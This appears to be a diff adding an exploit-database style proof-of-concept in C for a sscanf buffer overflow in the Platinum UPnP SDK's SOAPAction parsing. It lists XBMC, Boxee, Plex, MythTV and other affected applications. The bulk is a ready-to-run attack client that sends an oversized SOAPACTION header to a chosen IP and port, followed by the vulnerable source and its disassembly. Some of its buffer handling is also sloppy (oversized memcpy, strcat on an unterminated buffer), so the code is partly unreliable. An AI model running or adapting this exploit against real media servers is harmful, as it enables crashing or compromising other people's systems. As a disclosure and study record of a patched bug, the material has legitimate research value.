@@ -1,0 +1,273 @@
+/*
+                  -POC CODE Remote Buffer Overflow -
+=========================================================================
+! Exploit Title: Platinum SDK library post upnp sscanf buffer overflow !
+=========================================================================
+Date: 28th October 2010
+-----------------------
+Author: n00b  Realname: *carl cope* 
+-----------------------------------
+Software Link: http://www.plutinosoft.com/platinum
+--------------------------------------------------
+Version: All versions are affected Mulitple vendors 
+---------------------------------------------------
+Tested on: Windows xp sp3,Vista sp2,Linux unbuntu 
+---------------------------------------------------
+Fixed versions :Platinum 0.6.0
+==========================================================================
+-Mulitple vendors soap_action_name post upnp sscanf remote buffer overflow-
+==========================================================================
+
+-Description-
+
+First of all while i was testing the upnp in the xbmc application i 
+noticed after finding the vulnerable function in the source code it was 
+because of the Platinum UPnP SDK which was used for upnp protocol.
+
+There are more applications vulnerable to this exploit than i had first thought im 
+not writing an exploit for them all as it would be pointless i've passed the information
+to the developers of platinum sdk and when they have updated so will the rest of the 
+vendors hope fully.
+
+Any thing which uses this sdk is exploitable if you do decide to write an exploit for any
+of the vulnerable applications please give credits to n00b for finding the bug.!!
+
+The vendor has released a fix for this vulnerability 
+http://kent.dl.sourceforge.net/project/platinum/platinum/0.6.1/CHANGELOG.txt
+
+I would like to thank the vendor of the sdk for taking swift action and fixing this vulnerability
+swiftly 10/10 for communications and working to get this issue resolved.
+
+
+-Description-
+
+Version 2010-07-27 Platinum-SRC-0-6-0_632 SDK
+This is a list of the applications that are using the platinum SDK library.
+
+-Afected applications-
+Asset UPnP              = http://forum.dbpoweramp.com/showthread.php?t=18020 <-- Tested and is exploitable Release v.3.
+XBMC                    = http://xbmc.org/                                   <-- Tested and is exploitable/Exploit released.
+Google Simplify Media   = http://www.simplifymedia.com/blog/                 
+qvivo                   = http://www.qvivo.com/us/download/                  
+doubletwist             = http://www.doubletwist.com/                        
+Boxee                   = http://www.boxee.tv/                               
+BoxAmp                  = http://www.open7x0.org/wiki/BoxAmp                 
+Ventis Media            = http://www.mediamonkey.com/                        
+DVBSBridge              = http://www.dvblogic.com/                                
+IntelligentShare        = http://www.adoubleu.de/
+Easyon.tv               = http://www.easyon.tv/index.php
+Foobar plugin foo_upnp  = http://www.hydrogenaudio.org/forums/index.php?showtopic=69664
+plex                    = http://elan.plexapp.com/
+CommVault               = http://www.commvault.com/
+Iwedia                  = http://www.iwedia.com/
+Mythtv                  = http://www.mythtv.org/wiki/UPnP
+Vdr-plugin-upnp         = http://www.linuxtv.org/vdrwiki/index.php/Vdr-plugin-upnp
+
+
+Any thing that use this sdk is exploitable till the update is available.
+-Afected applications-
+
+
+-Shouts-
+Aluigi   = Take care m8 and all the best for the future !!.
+Corelan  = Keep up the good work thanks for the advice !!.
+Exploit-db = Looking good guys keep up the good work !!.
+XBMC-DEV = Nice work with the project looking nice !!.
+-Shouts-
+
+----------
+Disclaimer
+----------
+The information in this advisory and any of its
+demonstrations is provided "as is" without any
+warranty of any kind.
+ 
+I am not liable for any direct or indirect damages
+caused as a result of using the information or
+demonstrations provided in any part of this advisory.
+Educational use only..!!
+*/
+
+#include <stdio.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <netinet/in.h>
+
+/*
+'''          !!IMPORTATNT!!                       
+The UUID must be set i've hardcoded this 
+to make it easy to replace with the victim UUID
+you can get the UUID number from the server
+by issuing a get request to the vulnerable server
+on port 00000 you can use a web browser to do this.
+example = http://127.0.0.1:00000
+
+
+-Note-
+Just a side note the port is random and once the xbmc
+application is installed the UUID will be set up along 
+with the port number at installation so you will have to 
+do a port scan to find what port the service is running
+on but once its found it will be on that port till it 
+is reinstalled.Also the UUID will stay the same.
+
+Universally Unique Identifier
+---------------------------------------------------
+XML example
+<UDN>
+uuid:0970aa46-ee68-3174-d548-44b656447658
+</UDN> 
+---------------------------------------------------
+-Note-
+
+I was not going to write an xml paraser just for this
+when a web browser and a set of eyes can do it.:)
+
+Platinum UPnP SDK 
+http://www.plutinosoft.com/platinum
+http://sourceforge.net/users/c0diq
+'''
+*/
+//compiled using gcc on linux.
+//Cygwin on windows.
+
+void error(char *mess)
+{
+    perror(mess);
+    exit(1);
+}
+
+int main(int argc, char *argv[])
+{
+    int sock;
+    int input;
+    
+	struct sockaddr_in http_client;
+    char buf[2000];
+
+    unsigned int http_len;
+    
+
+    /* If there is more than 2 arguments passed print usage!!*/
+    if (argc != 3)
+    {
+        fprintf(stderr,"USAGE: Server_ip port\n");
+        exit(1);
+    }
+
+    /* Create socket */
+    if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
+    {
+        error("Cant create socket");
+    }
+
+
+    /* Construct sockaddr */
+    memset(&http_client, 0, sizeof(http_client));
+    http_client.sin_family = AF_INET;
+    http_client.sin_addr.s_addr = inet_addr(argv[1]);
+    http_client.sin_port = htons(atoi(argv[2]));
+
+    /* Establish connection */
+    if (connect(sock,
+                (struct sockaddr *) &http_client,
+                sizeof(http_client)) < 0)
+    {
+        error("Failed to connect with remote host");
+    }
+
+       //Build the upnp equest
+        memcpy(buf, "POST /AVTransport/ ", 18);
+        memcpy(buf+18, "0970aa46-ee68-3174-d548-44b656447658", 36); //Replace with uuid of the vulnerable server #
+		memcpy(buf+54, "/control.xml HTTP/1.1\r\n", 79);
+		strcat(buf, "SOAPACTION: \x22urn:schemas-upnp-org:service:AVTransport:1#");
+        strcat(buf,
+                 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+				 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+				 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+				 "AAAAAA\r\n"
+                 "CONTENT-TYPE:text/xml; charset=\x22utf-8\x22\r\n"
+		         "HOST: 192.168.1.2:26125\r\n" 
+		         "Content-Length: 345");
+                 
+				 /* Send our request to the server*/
+    http_len = strlen(buf);
+    if (send(sock, buf, http_len, 0) != http_len)
+	close(sock);
+    exit(0);
+}
+
+
+ /*
+
+                  -Vulnerable source code-
+ This information was found using windows 7 + Visual c++ 2010 express.
+
+ .\lib\libUPnP\Platinum\Source\Core\PltDeviceHost.cpp
+
+ ----------------------------------------------------------------------
+ |   PLT_DeviceHost::ProcessPostRequest
+ +---------------------------------------------------------------------
+ NPT_Result
+ PLT_DeviceHost::ProcessHttpPostRequest(NPT_HttpRequest&              request,
+                                       # const NPT_HttpRequestContext& context,
+                                       # NPT_HttpResponse&             response) 
+ {
+     NPT_Result                res;
+     NPT_String                service_type;
+     NPT_String                str;
+     NPT_XmlElementNode*       xml = NULL;
+     NPT_String                soap_action_header;
+     PLT_Service*              service;
+     NPT_XmlElementNode*       soap_body;
+     NPT_XmlElementNode*       soap_action;
+     const NPT_String*         attr;
+     PLT_ActionDesc*           action_desc;
+     PLT_ActionReference       action;
+     NPT_MemoryStreamReference resp(new NPT_MemoryStream);
+     NPT_String                ip_address  = context.GetRemoteAddress().GetIpAddress().ToString();
+     NPT_String                method      = request.GetMethod();
+     NPT_String                url         = request.GetUrl().ToRequestString(true);
+     NPT_String                protocol    = request.GetProtocol();
+
+     if (NPT_FAILED(FindServiceByControlURL(url, service, true)))
+         goto bad_request;
+
+     if (!request.GetHeaders().GetHeaderValue("SOAPAction"))
+         goto bad_request;
+
+       extract the soap action name from the header
+     soap_action_header = *request.GetHeaders().GetHeaderValue("SOAPAction");
+     soap_action_header.TrimLeft('"');
+     soap_action_header.TrimRight('"');
+     char prefix[200];
+     char soap_action_name[100];                    <--- 100 bytes allocated for the soap action name.
+     int  ret;
+     //FIXME: no sscanf
+     ret = sscanf(soap_action_header, "%[^#]#%s",   <--- 
+                 # prefix,                           <--- Bad very Bad.
+                 # soap_action_name);                <--- 
+     if (ret != 2)
+        # goto bad_request;
+
+     // read the xml body and parse it
+     if (NPT_FAILED(PLT_HttpHelper::ParseBody(request, xml))) <--- BOOOM I WIN!!
+        # goto bad_request;
+
+ Disassembly of vulnerable function.!!
+ ==================================
+ 025D2D23  lea         edx,[ebp-1F4h]  
+ 025D2D29  push        edx  
+ 025D2D2A  lea         eax,[ebp-188h]  
+ 025D2D30  push        eax  
+ 025D2D31  push        2F5E404h  
+ 025D2D36  lea         ecx,[ebp-44h]  
+ 025D2D39  call        NPT_String::operator char const * (1B1840Eh)  
+ 025D2D3E  push        eax  
+ 025D2D3F  call        @ILT+120575(_sscanf) (1AF7704h)  
+ 025D2D44  add         esp,10h  
+ 025D2D47  mov         dword ptr [ebp-1FCh],eax  
+*/
